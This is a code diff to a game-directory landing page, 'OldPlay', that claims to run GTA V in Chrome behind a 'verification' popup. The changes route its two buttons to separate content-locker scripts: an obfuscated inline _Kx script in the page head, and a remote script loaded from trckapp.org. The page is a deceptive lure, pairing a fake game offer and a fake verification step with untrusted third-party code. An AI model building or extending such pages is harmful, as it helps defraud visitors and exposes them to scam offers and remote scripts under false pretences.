@@ -11,7 +11,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
 
-  <!-- ===== Locker script (loaded in head, defines window._Kx) ===== -->
+  <!-- ===== Locker script for Try link 2 ONLY (loaded in head, defines window._Kx) ===== -->
   <script type="text/javascript">
     var fEkIy_jpI_FJARZc={"it":4637915,"key":"cd462"};
   </script>
@@ -43,7 +43,7 @@
     .hero h1{font-size:clamp(42px,6.7vw,82px);line-height:.96;letter-spacing:-.065em;margin:0 0 25px;max-width:760px}.hero h1 span{color:var(--lime)}
     .lead{font-size:clamp(17px,2vw,21px);line-height:1.55;color:#b5c8ce;max-width:650px;margin:0 0 30px}.actions{display:flex;gap:12px;flex-wrap:wrap}
     .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;min-height:49px;padding:0 22px;border-radius:8px;border:1px solid var(--lime);background:var(--lime);color:#0b1c14;font-weight:800;font-size:14px;letter-spacing:.02em;cursor:pointer}.btn:hover{filter:brightness(1.05)}.btn.secondary{background:transparent;color:#e8f1f2;border-color:#445a65}.btn.compact{min-height:38px;padding:0 13px;font-size:12px;gap:7px}.btn.compact svg{width:13px;height:13px;flex:none}
-    /* ===== Try link 2 button — dark ink color (not green) ===== */
+    /* ===== Try link 2 button — dark ink color (NOT green) ===== */
     .btn-ink{background:var(--ink);color:var(--bg);border-color:var(--ink)}
     .btn-ink:hover{filter:brightness(1.15)}
     .feature-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:18px}.feature-card{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}.feature-art{aspect-ratio:16/7;overflow:hidden;background:#0a1117}.feature-art img{display:block;width:100%;height:100%;object-fit:cover}.feature-body{padding:22px}.feature-kicker{font:600 10px "IBM Plex Mono";letter-spacing:.1em;text-transform:uppercase;color:var(--cyan)}.feature-card h3{font-size:24px;line-height:1.16;letter-spacing:-.025em;margin:8px 0}.feature-card p{color:var(--muted);line-height:1.55;margin:0 0 18px}.feature-card .btn{min-height:43px;padding:0 16px}
@@ -113,7 +113,12 @@
       <div class="wrap">
         <div class="section-head"><div><h2>Start here</h2><p>Open GTA V in Chrome — two verification links available.</p></div><span class="count">FEATURED / 02</span></div>
         <div class="feature-grid">
-          <!-- ===== GTA V card — Open GTA V (Link 1, lime green) + Try link 2 (dark ink, NOT green) + (i) tooltip ===== -->
+          <!--
+            ===== GTA V card =====
+            Open GTA V → uses the OLD locker script (URL-based, trckapp.org → og_load)
+            Try link 2 → uses the NEW locker script (_Kx() defined in head)
+            The two scripts are SEPARATE — each button only triggers its own.
+          -->
           <article class="feature-card" id="gta-feature">
             <div class="feature-art"><img src="assets/gta-v-browser.jpg" alt="GTA V running inside a Chrome browser window"></div>
             <div class="feature-body">
@@ -121,9 +126,9 @@
               <h3>GTA V in Chrome</h3>
               <p>A full PC game shown running directly in the browser, without a separate launcher.</p>
               <div class="gta-actions">
-                <!-- Open GTA V = Link 1 (lime green, default .btn) -->
-                <button class="btn verify-trigger" type="button" data-game="GTA V in Chrome" data-mode="kx" data-fallback="https://your-deployment-url.com/fcba2c5">Open GTA V ↗&#xFE0E;</button>
-                <!-- Try link 2 (dark ink, NOT green) — data-game shows as "GTA V ( Link 2 )" inside verify popup -->
+                <!-- Open GTA V (Link 1) — OLD locker script, URL-based: trckapp.org → og_load() -->
+                <button class="btn verify-trigger" type="button" data-game="GTA V in Chrome" data-locker="https://trckapp.org/cl/js/7jwoqk">Open GTA V ↗&#xFE0E;</button>
+                <!-- Try link 2 — NEW locker script: _Kx() from head -->
                 <button class="btn btn-ink verify-trigger" type="button" data-game="GTA V ( Link 2 )" data-mode="kx" data-fallback="https://your-deployment-url.com/fcba2c5">Try link 2 ↗&#xFE0E;</button>
                 <!-- (i) info tooltip -->
                 <span class="info-tip" tabindex="0" role="button" aria-label="Info: If link 1 didn't work please try link 2">
@@ -178,7 +183,7 @@
 
   <footer><div class="wrap foot"><span>© 2026 OldPlay · Classic game directory</span></div></footer>
 
-  <!-- ===== Verify popup — single Verify button. Calls _Kx() in kx mode, loads URL locker in url mode. ===== -->
+  <!-- ===== Verify popup — single Verify button. Routes to the right locker based on mode. ===== -->
   <dialog class="verify-dialog" id="verificationDialog" aria-labelledby="verifyTitle">
     <div class="verify-panel">
       <button class="close" id="verifyClose" type="button" aria-label="Close verification">×</button>
@@ -306,7 +311,12 @@
         },500);
       }
 
-      // ===== Single Verify button: calls _Kx() in kx mode, loads URL locker in url mode =====
+      // ============================================================
+      //  Verify button — ROUTES TO THE RIGHT LOCKER BASED ON MODE
+      //   - url mode (Open GTA V, games grid) → loadLocker(URL) + og_load()
+      //   - kx  mode (Try link 2)              → _Kx()  from head
+      //  The two lockers never mix — each button only fires its own.
+      // ============================================================
       verifyButton.addEventListener("click",function(){
         if(!selectedLocker && selectedMode!=="kx"){return}
         verifyButton.disabled=true;
@@ -317,7 +327,7 @@
 
         setTimeout(function(){
           if(selectedMode==="kx"){
-            // GTA V — Link 1 / Link 2: call _Kx() (defined by head script)
+            // ----- Try link 2: NEW locker (_Kx from head) -----
             if(typeof window._Kx==="function"){
               try{
                 window._Kx();
@@ -328,7 +338,7 @@
               window.open(selectedFallback,"_blank","noopener");
             }
           }else{
-            // Games grid — URL-based locker (trckapp / apptrck)
+            // ----- Open GTA V (Link 1) + games grid: OLD locker (URL → og_load) -----
             loadLocker(selectedLocker).then(function(){
               setTimeout(function(){
                 var autoStarted=(document.body.style.display==="none")||!!document.getElementById("test_iframe");
